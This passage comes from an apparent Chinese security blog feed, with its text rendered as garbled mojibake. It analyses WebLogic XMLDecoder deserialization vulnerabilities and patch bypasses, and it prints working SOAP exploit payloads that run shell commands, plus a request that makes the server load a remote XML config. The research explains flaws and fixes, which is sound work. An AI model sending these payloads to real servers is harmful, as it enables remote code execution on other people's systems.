class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;1&quot;&gt;</span><br><span class="line">&lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;2&quot;&gt;</span><br><span class="line">&lt;string&gt;open -a Calculator&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/array&gt;</span><br><span class="line">&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;</span><br><span class="line">&lt;/java&gt;</span><br><span class="line">&lt;/work:WorkContext&gt;</span><br><span class="line">&lt;/soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body/&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure></p><p><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846063256977.jpg" alt="-w1288"></p><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>ä»pocçš„è·¯ç”±æ¥çœ‹ï¼Œwls-wsatè¿™ä¸ªæ¥å£å‡ºäº†é—®é¢˜ï¼Œæ‰¾åˆ°è¯¥waråŒ…çš„web.xmlé…ç½®ï¼Œå®šä½åˆ°å…¶å¯¹åº”çš„Servletï¼šweblogic.wsee.wstx.wsat.v10.endpoint.CoordinatorPortTypePortImpl<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846063256989.jpg" alt="-w1538"></p><p>è¿™ä¸ªå³ä¸ºæ¼æ´ä½œç”¨çš„æ¥å£ï¼Œå…ˆä»expçš„å“åº”åŒ…è¿”å›çš„è°ƒç”¨æ ˆæ¥è·Ÿä¸€ä¸‹processRequestï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846063256998.jpg" alt="-w1061"></p><p>weblogic.wsee.jaxws.workcontext.WorkContextServerTube#processRequest<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846063257009.jpg" alt="-w1393"><br>var1å³æˆ‘ä»¬ä¼ å…¥çš„XMLï¼Œvar3ä¸ºsoapæ ‡ç­¾è§£æç»“æœï¼Œè·Ÿè¿›weblogic.wsee.jaxws.workcontext.WorkContextTube#readHeaderOld<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846063257022.jpg" alt="-w1407"><br>var4ä¸ºpocå…³é”®éƒ¨åˆ†ï¼Œè·Ÿè¿›receiveå‡½æ•°ï¼Œ/weblogic/wsee/jaxws/workcontext/WorkContextServerTube.class#receive<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846063257031.jpg" alt="-w1196"></p><p>ä¸€ç›´å¾€ä¸‹è·Ÿï¼š<br>-&gt; /weblogic/workarea/WorkContextLocalMap.class#receiveRequest<br>-&gt; /weblogic/workarea/spi/WorkContextEntryImpl.class#readEntry<br>-&gt; /weblogic/wsee/workarea/WorkContextXmlInputAdapter.class#readUTF<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846063257040.jpg" alt="-w867"><br>è°ƒç”¨äº†xmlDecoderçš„<code>readObject</code>å‡½æ•°è¿›è¡Œååºåˆ—åŒ–æ“ä½œï¼Œæœ€ç»ˆé€ æˆå‘½ä»¤æ‰§è¡Œã€‚</p><p>è°ƒç”¨æ ˆï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846063257047.jpg" alt="-w533"></p><h2 id="è¡¥ä¸"><a href="#è¡¥ä¸" class="headerlink" title="è¡¥ä¸"></a>è¡¥ä¸</h2><p>weblogicè¡¥ä¸åªç»™ä»˜è´¹ç”¨æˆ·å‘ï¼Œæˆ‘ä¹Ÿå°±åªèƒ½åº·åº·åˆ«äººæ–‡ç« é‡Œçš„è¡¥ä¸æ¥åˆ†æäº†ã€‚</p><p>è¿™é‡Œè¡¥ä¸åœ¨<code>WorkContextXmlInputAdapter</code>ä¸­æ·»åŠ äº†<code>validate</code>éªŒè¯ï¼Œé™åˆ¶äº†Objectæ ‡ç­¾ï¼Œä»è€Œé™åˆ¶é€šè¿‡XMLæ¥æ„é€ ç±»ã€‚<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">validate</span><span class="params">(InputStream is)</span> </span>&#123;</span><br><span class="line">      WebLogicSAXParserFactory factory = <span class="keyword">new</span> WebLogicSAXParserFactory();</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">         SAXParser parser = factory.newSAXParser();</span><br><span class="line">         parser.parse(is, <span class="keyword">new</span> DefaultHandler() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startElement</span><span class="params">(String uri, String localName, String qName, Attributes attributes)</span> <span class="keyword">throws</span> SAXException </span>&#123;</span><br><span class="line">               <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">"object"</span>)) &#123;</span><br><span class="line">                  <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid context type: object"</span>);</span><br><span class="line">               &#125;</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (ParserConfigurationException var5) &#123;</span><br><span class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Parser Exception"</span>, var5);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (SAXException var6) &#123;</span><br><span class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Parser Exception"</span>, var6);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (IOException var7) &#123;</span><br><span class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Parser Exception"</span>, var7);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></p><p>è¿™ä¸ªç‰ˆæœ¬å¯¹åº”çš„poc:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">"https://schemas.xmlsoap.org/soap/envelope/"</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">"https://bea.com/2004/06/soap/workarea/"</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">java</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">"java.lang.String"</span> <span class="attr">length</span>=<span class="string">"3"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>/bin/bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"2"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>open -a Calculator<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"start"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">soapenv:Body</span>/&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>ä¹Ÿæ­£æ˜¯å› ä¸ºè¿™æ ·çš„é»‘åå•é™åˆ¶ï¼Œæ‰€ä»¥å¾ˆå¿«å°±å‡ºäº†CVE-2017-10271ã€‚</p><h3 id="CVE-2017-10271"><a href="#CVE-2017-10271" class="headerlink" title="CVE-2017-10271"></a>CVE-2017-10271</h3><p>è¿™ä¸ªç‰ˆæœ¬å¯¹åº”çš„pocï¼Œå³å’Œä¸Šè¾¹çš„åŒºåˆ«å³å°†<code>object</code>ä¿®æ”¹æˆ<code>void</code>ï¼Œå°±è½»æ¾ç»•è¿‡äº†è¡¥ä¸ï¼š<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">"https://schemas.xmlsoap.org/soap/envelope/"</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">"https://bea.com/2004/06/soap/workarea/"</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">java</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">"java.lang.String"</span> <span class="attr">length</span>=<span class="string">"3"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>/bin/bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"2"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>open -a Calculator<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"start"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">soapenv:Body</span>/&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>ç®€å•çœ‹äº†ä¸€äº›<a href="https://xz.aliyun.com/t/5069" target="_blank" rel="noopener">XMLDecoderè§£ææµç¨‹åˆ†æ</a>æ–‡ç« ä¸­çš„åˆ†æï¼Œ<code>VoidElementHandler</code>ç±»ç»§æ‰¿çš„<code>ObjectElementsHandler</code>ç±»ï¼Œåªæ”¹å†™äº†<code>isArgument</code>å‡½æ•°ï¼Œè€Œåœ¨æ•´ä¸ªè§¦å‘è¿‡ç¨‹ä¸­å¹¶æ— å½±å“ï¼Œæ‰€ä»¥æ­¤å¤„ä½¿ç”¨voidæ ‡ç­¾ä¸objectæ ‡ç­¾æ²¡æœ‰åŒºåˆ«ã€‚<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846063257057.jpg" alt=""></p><p>è€Œè¡¥ä¸çš„å½¢å¼ä¾ç„¶æ˜¯é»‘åå•é™åˆ¶æ ‡ç­¾çš„å½¢å¼ï¼š<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">validate</span><span class="params">(InputStream is)</span> </span>&#123;</span><br><span class="line">   WebLogicSAXParserFactory factory = <span class="keyword">new</span> WebLogicSAXParserFactory();</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">      SAXParser parser = factory.newSAXParser();</span><br><span class="line">      parser.parse(is, <span class="keyword">new</span> DefaultHandler() &#123;</span><br><span class="line">         <span class="keyword">private</span> <span class="keyword">int</span> overallarraylength = <span class="number">0</span>;</span><br><span class="line">         <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startElement</span><span class="params">(String uri, String localName, String qName, Attributes attributes)</span> <span class="keyword">throws</span> SAXException </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">"object"</span>)) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid element qName:object"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">"new"</span>)) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid element qName:new"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">"method"</span>)) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid element qName:method"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">"void"</span>)) &#123;</span><br><span class="line">                  <span class="keyword">for</span>(<span class="keyword">int</span> attClass = <span class="number">0</span>; attClass &lt; attributes.getLength(); ++attClass) &#123;</span><br><span class="line">                     <span class="keyword">if</span>(!<span class="string">"index"</span>.equalsIgnoreCase(attributes.getQName(attClass))) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid attribute for element void:"</span> + attributes.getQName(attClass));</span><br><span class="line">                     &#125;</span><br><span class="line">                  &#125;</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">"array"</span>)) &#123;</span><br><span class="line">                  String var9 = attributes.getValue(<span class="string">"class"</span>);</span><br><span class="line">                  <span class="keyword">if</span>(var9 != <span class="keyword">null</span> &amp;&amp; !var9.equalsIgnoreCase(<span class="string">"byte"</span>)) &#123;</span><br><span class="line">                     <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"The value of class attribute is not valid for array element."</span>);</span><br><span class="line">                  &#125;</span><br></pre></td></tr></table></figure></p><h3 id="CVE-2019-2725"><a href="#CVE-2019-2725" class="headerlink" title="CVE-2019-2725"></a>CVE-2019-2725</h3><p>æ—¶éš”ä¸¤å¹´ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">POST /_async/AsyncResponseService HTTP/1.1</span><br><span class="line">Host: localhost:7001</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: text/xml</span><br><span class="line">Content-Length: 728</span><br><span class="line">Cookie: remember-me=MXPUSANQRVaBJYtUucUgmQ==</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;https://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:wsa=&quot;https://www.w3.org/2005/08/addressing&quot; xmlns:asy=&quot;https://www.bea.com/async/AsyncResponseService&quot;&gt;</span><br><span class="line">   &lt;soapenv:Header&gt; </span><br><span class="line">   &lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;</span><br><span class="line">   &lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;</span><br><span class="line">   &lt;work:WorkContext xmlns:work=&quot;https://bea.com/2004/06/soap/workarea/&quot;&gt;</span><br><span class="line">   &lt;java&gt;</span><br><span class="line">&lt;class&gt;&lt;string&gt;com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext&lt;/string&gt;</span><br><span class="line">&lt;void&gt;</span><br><span class="line">&lt;string&gt;https://xxxx&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/class&gt;</span><br><span class="line">&lt;/java&gt;</span><br><span class="line">&lt;/work:WorkContext&gt;   </span><br><span class="line">&lt;/soapenv:Header&gt;   </span><br><span class="line">&lt;soapenv:Body&gt;     </span><br><span class="line">&lt;asy:onAsyncDelivery/&gt;   </span><br><span class="line">&lt;/soapenv:Body&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure></p><p>ä½¿ç”¨classæ ‡ç­¾æ„é€ ç±»ï¼Œä½†æ˜¯ç”±äºé™åˆ¶äº†methodå‡½æ•°ï¼Œæ— æ³•è¿›è¡Œå‡½æ•°è°ƒç”¨ï¼Œåªèƒ½ä»æ„é€ æ–¹æ³•ä¸‹æ‰‹ï¼Œä¸”å‚æ•°ä¸ºåŸºæœ¬ç±»å‹ï¼š</p><ul><li>æ„é€ å‡½æ•°æœ‰å†™æ–‡ä»¶æ“ä½œï¼Œæ–‡ä»¶åå’Œå†…å®¹å¯æ§ï¼Œå¯ä»¥è¿›è¡Œgetshellã€‚</li><li>æ„é€ å‡½æ•°æœ‰å…¶ä»–çš„ååºåˆ—åŒ–æ“ä½œï¼Œæˆ‘ä»¬å¯ä»¥è¿›è¡ŒäºŒæ¬¡ååºåˆ—åŒ–æ“ä½œã€‚</li><li>æ„é€ å‡½æ•°ç›´æ¥æœ‰æ‰§è¡Œå‘½ä»¤çš„æ“ä½œï¼Œæ‰§è¡Œå‘½ä»¤å¯æ§ã€‚</li><li>æœ‰å…¶å®ƒçš„å¯èƒ½å¯¼è‡´rceçš„æ“ä½œï¼Œæ¯”å¦‚è¡¨è¾¾å¼æ³¨å…¥ä¹‹ç±»çš„ã€‚</li></ul><p>ç½‘ä¸Šé€šç”¨çš„æœ‰ï¼š</p><ul><li>FileSystemXmlApplicationContext</li><li>UnitOfWorkChangeSet</li></ul><p>è¿™æ¬¡çš„ä¿®å¤æœ€ç»ˆå°†classæ ‡ç­¾ç»™ç¦ç”¨äº†ã€‚</p><h3 id="cve-2019-2729"><a href="#cve-2019-2729" class="headerlink" title="cve-2019-2729"></a>cve-2019-2729</h3><p><a href="https://xz.aliyun.com/t/7116" target="_blank" rel="noopener">https://xz.aliyun.com/t/7116</a><br>jdk1.7æ¯”jdk1.6å¤šäº†å‡ ä¸ªæ ‡ç­¾<code>property</code>å’Œ<code>field</code>æ ‡ç­¾ã€‚é€šè¿‡è°ƒç”¨é™æ€å±æ€§çš„<code>get</code>ã€<code>set</code>æ–¹æ³•æ¥è§¦å‘ã€‚</p><h2 id="æœ€å"><a href="#æœ€å" class="headerlink" title="æœ€å"></a>æœ€å</h2><p>èƒ½åŠ›æœ‰é™ï¼Œä»æ­å»ºåˆ°å¤ç°åˆ†æèŠ±äº†ä¸å°‘æ—¶é—´ï¼Œåœ¨è¿‡ç¨‹ä¸­ä¹Ÿå­¦ä¹ æ”¶è·ä¸å°‘ã€‚æœ€åæ„Ÿè°¢@hu3skyå¸ˆå‚…çš„å¸®åŠ©ï¼Œä»¥åŠä¸‹é¢è¿™äº›å¸ˆå‚…çš„æ–‡ç« åˆ†äº«ã€‚</p><p>å‚è€ƒæ–‡ç« ï¼š</p><ul><li><a href="https://whip1ash.cn/2018/10/21/weblogic-deserialization" target="_blank" rel="noopener">@whip1ash CVE-2017-3506 &amp; CVE-2017-10271 - ä»0å¼€å§‹å­¦ä¹ Javaååºåˆ—åŒ– (1) </a></li><li><a href="https://github.com/gyyyy/footprint/blob/master/articles/2019/about-java-serialization-and-deserialization.md" target="_blank" rel="noopener">@gyyyyã€Šæµ…æJavaåºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‹</a></li><li><a href="https://badcode.cc/2018/05/20/WebLogic-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" target="_blank" rel="noopener">WebLogic åŠ¨æ€è°ƒè¯•ç¯å¢ƒæ­å»º</a></li><li><a href="https://xz.aliyun.com/t/5069" target="_blank" rel="noopener">XMLDecoderè§£ææµç¨‹åˆ†æ</a></li><li><a href="https://www.kingkk.com/2019/05/Weblogic-XMLDecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">@kingkk Weblogic-XMLDecoderååºåˆ—åŒ–å­¦ä¹ </a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="Web" scheme="https://0day.design/categories/Web/"/>
    
    
      <category term="Java" scheme="https://0day.design/tags/Java/"/>
    
      <category term="æ¼æ´åˆ†æ" scheme="https://0day.design/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="weblogic" scheme="https://0day.design/tags/weblogic/"/>
    
  </entry>
  
  <entry>
    <title>JNDIæ³¨å…¥é«˜ç‰ˆæœ¬jdkç»•è¿‡å­¦ä¹ </title>
    <link href="https://0day.design/2020/02/04/JNDI%E6%B3%A8%E5%85%A5%E9%AB%98%E7%89%88%E6%9C%ACjdk%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/"/>
    <id>https://0day.design/2020/02/04/JNDIæ³¨å…¥é«˜ç‰ˆæœ¬jdkç»•è¿‡å­¦ä¹ /</id>
    <published>2020-02-04T11:10:00.000Z</published>
    <updated>2020-03-19T12:47:56.509Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>åœ¨ä¹‹å‰çš„å¤ç°åˆ†æè¿‡ç¨‹ä¸­ç”¨åˆ°çš„jdkç‰ˆæœ¬éƒ½æ˜¯è¾ƒä½çš„ç‰ˆæœ¬ï¼Œè¿™ç¯‡æ–‡ç« ä¸»è¦ç ”ç©¶ä¸åŒjdkç‰ˆæœ¬å¯¹JNDIæ³¨å…¥ä¸åŒå§¿åŠ¿çš„å½±å“ï¼Œä»¥åŠç»•è¿‡å§¿åŠ¿ã€‚å…³äºJNDIæ³¨å…¥å’ŒRMIçš„åŸºç¡€çŸ¥è¯†å¯ä»¥å‚è€ƒè¿™ä¸¤ç¯‡æ–‡ç« å­¦ä¹ ï¼š</p><ul><li><a href="https://curz0n.github.io/2019/09/20/cve-2019-14540/" target="_blank" rel="noopener">curz0n: CVE-2019-14540è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æ&amp;å¤ç°</a></li><li><a href="https://kingx.me/Exploit-Java-Deserialization-with-RMI.html" target="_blank" rel="noopener">kingx: æ·±å…¥ç†è§£JNDIæ³¨å…¥ä¸Javaååºåˆ—åŒ–æ¼æ´åˆ©ç”¨</a></li></ul><h2 id="RMI-Remote-Object-Payload-é™åˆ¶è¾ƒå¤šï¼Œä¸å¸¸ä½¿ç”¨"><a href="#RMI-Remote-Object-Payload-é™åˆ¶è¾ƒå¤šï¼Œä¸å¸¸ä½¿ç”¨" class="headerlink" title="RMI Remote Object Payload (é™åˆ¶è¾ƒå¤šï¼Œä¸å¸¸ä½¿ç”¨)"></a>RMI Remote Object Payload (é™åˆ¶è¾ƒå¤šï¼Œä¸å¸¸ä½¿ç”¨)</h2><h2 id="RMI-JNDI-Reference-Payload"><a href="#RMI-JNDI-Reference-Payload" class="headerlink" title="RMI + JNDI Reference Payload"></a>RMI + JNDI Reference Payload</h2><p>è¿™ä¸ªæ–¹æ³•å°±æ˜¯æˆ‘ä»¬å¸¸ç”¨çš„åŠ è½½è¿œç¨‹classè¿›è¡ŒJNDIæ³¨å…¥çš„æ“ä½œï¼Œæ”»å‡»è€…é€šè¿‡RMIæœåŠ¡è¿”å›ä¸€ä¸ªJNDI Naming Referenceï¼Œå—å®³è€…è§£ç Referenceæ—¶ä¼šå»æˆ‘ä»¬æŒ‡å®šçš„Codebaseè¿œç¨‹åœ°å€åŠ è½½Factoryç±»ï¼Œä½†æ˜¯åŸç†ä¸Šå¹¶éä½¿ç”¨RMI Class Loadingæœºåˆ¶çš„ï¼Œå› æ­¤ä¸å— <code>java.rmi.server.useCodebaseOnly</code>ç³»ç»Ÿå±æ€§çš„é™åˆ¶ï¼Œç›¸å¯¹æ¥è¯´æ›´åŠ é€šç”¨ã€‚</p><p>ä½†æ˜¯åœ¨JDK 6u132,JDK 7u122,JDK 8u113 ä¸­Javaæå‡äº†JNDI é™åˆ¶äº†Naming/DirectoryæœåŠ¡ä¸­JNDI Referenceè¿œç¨‹åŠ è½½Object Factoryç±»çš„ç‰¹æ€§ã€‚ç³»ç»Ÿå±æ€§<code>com.sun.jndi.rmi.object.trustURLCodebase</code>ã€<code>com.sun.jndi.cosnaming.object.trustURLCodebase</code> çš„é»˜è®¤å€¼å˜ä¸ºfalseï¼Œå³é»˜è®¤ä¸å…è®¸ä»è¿œç¨‹çš„CodebaseåŠ è½½Referenceå·¥å‚ç±»ã€‚å¦‚æœéœ€è¦å¼€å¯RMI Registryæˆ–è€…COS Naming Service Providerçš„è¿œç¨‹ç±»åŠ è½½åŠŸèƒ½ï¼Œéœ€è¦å°†å‰é¢è¯´çš„ä¸¤ä¸ªå±æ€§å€¼è®¾ç½®ä¸ºtrueã€‚</p><p>Changelog:</p><ul><li>JDK 6u141 <a 